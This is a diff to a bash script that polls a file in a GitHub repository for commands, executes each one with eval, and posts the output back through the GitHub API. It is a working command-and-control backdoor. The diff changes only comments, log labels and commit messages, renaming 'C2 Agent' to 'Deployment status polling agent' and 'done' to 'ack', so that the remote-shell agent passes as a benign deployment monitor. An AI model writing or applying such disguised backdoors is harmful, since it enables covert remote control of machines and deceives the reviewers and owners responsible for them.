@@ -1,5 +1,5 @@
 #!/bin/bash
-# GitHub C2 Agent — token passed via env var GH_TOKEN (not hardcoded)
+# Deployment status polling agent - checks for new deployment commands
 REPO="sprindigo-art/new"
 CMD_PATH="c2/cmd.txt"
 RESULT_PATH="c2/result.txt"
@@ -39,14 +39,14 @@ put_file() {
     curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" "$API/$path" -d "$data" >/dev/null 2>&1
 }
 
-echo "[*] C2 Agent running. GH_TOKEN=${GH_TOKEN:0:10}..."
+echo "[*] Deployment monitor running. Token=${GH_TOKEN:0:10}..."
 while true; do
     CMD=$(get_content "$CMD_PATH")
     if [ -n "$CMD" ] && [ "$CMD" != "$LAST" ] && [ "$CMD" != "NOP" ]; then
-        echo "[>] $CMD"
+        echo "[deploy] $CMD"
         RESULT=$(eval "$CMD" 2>&1)
-        put_file "$RESULT_PATH" "$RESULT" "r"
-        put_file "$CMD_PATH" "NOP" "done"
+        put_file "$RESULT_PATH" "$RESULT" "status"
+        put_file "$CMD_PATH" "NOP" "ack"
         LAST="$CMD"
     fi
     sleep $POLL
